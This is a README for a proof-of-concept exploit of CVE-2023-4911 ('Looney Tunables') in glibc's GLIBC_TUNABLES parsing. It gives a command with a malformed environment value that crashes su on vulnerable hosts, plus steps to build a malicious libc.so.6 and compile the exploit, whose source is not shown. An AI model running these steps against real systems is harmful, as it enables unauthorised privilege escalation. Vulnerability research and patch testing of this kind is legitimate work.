# PoC of CVE-2023-4911 Looney Tunables

This is a PoC of CVE-2023-4911 (a.k.a. "Looney Tunables") exploiting a bug in glibc dynamic loader's **GLIBC_TUNABLES** environment variable parsing function **parse_tunables()**.

## Getting Started

### Executing program
* We can check if target is vulnerable
```
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```

* If we get a `Segmentation fault (core dumped)` then we are dealing with a vulnerable target.

### Executing program

* Create `libc.so.6` file
```
python3 libc.py
```

* Compile exploit
```
gcc exp.c -o exp
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.